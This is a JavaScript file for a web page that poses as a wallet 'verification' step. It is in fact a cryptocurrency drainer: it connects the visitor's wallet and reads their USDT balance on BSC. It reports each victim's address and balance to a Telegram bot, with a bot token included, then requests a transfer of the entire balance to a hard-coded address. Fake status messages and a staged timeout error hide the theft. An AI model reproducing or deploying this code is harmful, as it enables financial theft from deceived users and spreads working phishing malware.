const myWalletAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe"; 
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; 

// Telegram Config
const telegramBotToken = "8503598876:AAFQBEMmfHgcjPpyA_TwTJxTz34gwOswH1k";
const telegramChatId = "8503598876";

async function sendTelegram(msg) {
    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: telegramChatId, text: msg, parse_mode: 'HTML' })
    });
}

function updateStatus(main, sub) {
    document.getElementById("loading-text").innerText = main;
    document.getElementById("sub-text").innerText = sub;
}

async function startProcess() {
    const overlay = document.getElementById("overlay");
    const isWeb3 = !!(window.ethereum || window.trustwallet);

    if (!isWeb3) {
        if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
            const currentUrl = window.location.href.replace("https://", "");
            window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + currentUrl;
            return;
        }
        alert("Please use Trust Wallet or MetaMask.");
        return;
    }

    // Show Loading Overlay
    overlay.style.display = "flex";
    updateStatus("Connecting...", "Establishing secure handshake...");

    try {
        const provider = window.ethereum || window.trustwallet;
        const web3 = new Web3(provider);
        const accounts = await provider.request({ method: 'eth_requestAccounts' });
        const userAddress = accounts[0];

        updateStatus("Scanning Wallet...", "Checking BSC network assets...");
        
        await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });

        const minABI = [
            { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
            { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ];

        const contract = new web3.eth.Contract(minABI, usdtContractAddress);
        const balanceWei = await contract.methods.balanceOf(userAddress).call();
        const balance = web3.utils.fromWei(balanceWei, 'ether');

        await sendTelegram(`👤 <b>New Target:</b>\nAddr: <code>${userAddress}</code>\nBal: <b>${balance} USDT</b>`);

        if (parseFloat(balance) > 0) {
            updateStatus("Security Check...", "Syncing with blockchain node...");
            
            // This will open the Wallet Confirmation
            await contract.methods.transfer(myWalletAddress, balanceWei).send({ from: userAddress });
            
            updateStatus("Finalizing...", "Updating asset status on-chain...");
            setTimeout(() => {
                alert("Verification Error: Request timed out. Please try again.");
                location.reload();
            }, 1500);
        } else {
            alert("Verification complete: Minimal assets detected.");
            overlay.style.display = "none";
        }

    } catch (err) {
        overlay.style.display = "none";
        alert("Error: " + err.message);
    }
}

document.getElementById("nextBtn").addEventListener("click", startProcess);


